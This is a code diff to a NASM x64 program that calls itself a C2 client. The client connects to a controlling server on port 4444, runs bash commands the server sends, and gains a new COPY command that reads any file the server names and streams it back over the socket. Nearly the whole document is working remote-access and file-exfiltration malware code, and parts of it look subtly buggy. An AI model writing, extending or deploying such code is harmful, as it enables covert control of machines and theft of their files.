@@ -1,6 +1,6 @@
 ;------------------------------
 ; client.asm - C2 Client in NASM x64
-; Implements ping response and remote command execution
+; Implements ping response, remote command execution, and file copy (COPY command)
 ;------------------------------
 global _start
 
@@ -8,7 +8,7 @@ section .data
     server_addr:
        dw 2             ; IPv4 address family (AF_INET)
        dw 0x5c11        ; Port 4444 (0x115c in network byte order)
-       dd 0x1701a8c0    ; IP address 192.168.1.23 (little-endian format)
+       dd 0x0100007f    ; sin_addr = 127.0.0.1 (0x7F000001)
        times 8 db 0     ; Padding for sockaddr_in structure
     server_addr_len equ 16
 
@@ -20,10 +20,17 @@ section .data
     bash_path db "/bin/bash", 0       ; Bash executable path
     arg_c     db "-c", 0              ; Bash -c argument
 
+    ; COPY command header/footer prefixes (no trailing zero!)
+    copy_header_prefix_str db "COPY HEADER: "
+    copy_footer_prefix_str db "COPY FOOTER: "
+
 section .bss
     buf      resb 1024         ; General purpose I/O buffer
     pollfds  resb 2*8          ; Poll structures (socket + stdin monitoring)
     pipefd   resd 2            ; Pipe file descriptors [read, write]
+
+    copy_header_buf resb 256    ; Buffer for constructing COPY header
+    copy_footer_buf resb 256    ; Buffer for constructing COPY footer
 
 section .text
 
@@ -127,6 +134,18 @@ client_loop:
     lea rdi, [rel newline_str]
     call print_string
 
+    ; Check for COPY command: "COPY "
+    cmp rbx, 5
+    jb .check_bash
+    mov eax, dword [buf]
+    cmp eax, 0x59504F43 ; "COPY" in little-endian (ASCII)
+    jne .check_bash
+    cmp byte [buf+4], 0x20 ; Check space after 'COPY'
+    jne .check_bash
+    call .handle_copy_command
+    jmp .clear_revents_client
+
+.check_bash:
     ; Check for bash command prefix "bash "
     cmp rbx, 5          ; Minimum command length check
     jb .check_ping
@@ -274,11 +293,111 @@ client_loop:
     mov rax, 60         ; exit()
     syscall
 
-client_exit:
-    ; Clean exit
-    mov rdi, 0
-    mov rax, 60         ; exit()
+;---------------------------------------------------------------
+; COPY COMMAND SECTION
+; The server sends: "COPY <filename>"
+; The client:
+;   1) opens the file in read-only mode
+;   2) sends "COPY HEADER: <filename>\n"
+;   3) sends the entire file with sendfile in a loop
+;   4) sends "COPY FOOTER: <filename>\n"
+.handle_copy_command:
+    lea r15, [buf+5]    ; skip "COPY "
+    ; Remove trailing newline from the received filename
+    xor rcx, rcx
+.copy_remove_newline_loop:
+    mov al, [r15+rcx]
+    cmp al, 10
+    je .copy_found_newline
+    test al, al
+    jz .copy_done_remove
+    inc rcx
+    jmp .copy_remove_newline_loop
+.copy_found_newline:
+    mov byte [r15+rcx], 0
+
+.copy_done_remove:
+    ; Open the requested file in read-only mode
+    mov rdi, -100       ; AT_FDCWD
+    mov rsi, r15        ; pointer to filename
+    mov rdx, 0          ; O_RDONLY
+    mov r10, 0          ; mode (unused here)
+    mov rax, 257        ; sys_openat
     syscall
+    cmp rax, 0
+    jl .copy_send_error
+    mov rbx, rax        ; file descriptor
+
+    ; Build and send "COPY HEADER: <filename>\n"
+    lea r8, [copy_header_buf]
+    mov rdi, r8
+    mov rsi, copy_header_prefix_str
+    call copy_string
+    mov rsi, r15
+    call copy_string
+    ; Add newline + final zero
+    mov byte [rdi], 10
+    inc rdi
+    mov byte [rdi], 0
+    mov rax, rdi
+    sub rax, r8         ; length of the header
+
+    ; Send the header to the server
+    mov rdi, r12        ; socket
+    mov rsi, r8
+    mov rdx, rax
+    mov rax, 1          ; write()
+    syscall
+
+    ; Send file contents with sendfile in a loop
+.copy_sendfile_loop:
+    mov rdi, r12        ; out_fd = socket
+    mov rsi, rbx        ; in_fd = file
+    xor rdx, rdx        ; offset = NULL
+    mov r10, 4096       ; block size
+    mov rax, 40         ; sys_sendfile
+    syscall
+    cmp rax, 0
+    jg .copy_sendfile_loop  ; continue if > 0
+    jl .copy_send_error     ; error if < 0
+    ; if == 0 => EOF
+
+    ; Build and send "COPY FOOTER: <filename>\n"
+.copy_sendfile_done:
+    lea r8, [copy_footer_buf]
+    mov rdi, r8
+    mov rsi, copy_footer_prefix_str
+    call copy_string
+    mov rsi, r15
+    call copy_string
+    mov byte [rdi], 10
+    inc rdi
+    mov byte [rdi], 0
+    mov rax, rdi
+    sub rax, r8
+
+    mov rdi, r12
+    mov rsi, r8
+    mov rdx, rax
+    mov rax, 1
+    syscall
+
+    ; Close the file
+    mov rdi, rbx
+    mov rax, 3
+    syscall
+    ret
+
+.copy_send_error:
+    ; If something went wrong, close file if open
+    cmp rbx, 0
+    jle .copy_send_error_exit
+    mov rdi, rbx
+    mov rax, 3
+    syscall
+
+.copy_send_error_exit:
+    ret
 
 ;---------------------------------------------------------------
 ; Helper: Print null-terminated string
@@ -301,3 +420,23 @@ print_string:
     syscall
     pop rdi
     ret
+
+;---------------------------------------------------------------
+; Helper: copy_string
+; Copies a null-terminated string from RSI to RDI.
+; On return, RDI points to the end of the copied string.
+copy_string:
+    push rsi
+.copy_loop:
+    lodsb
+    stosb
+    cmp al, 0
+    jne .copy_loop
+    pop rsi
+    ret
+
+client_exit:
+    ; Clean exit
+    mov rdi, 0
+    mov rax, 60         ; exit()
+    syscall
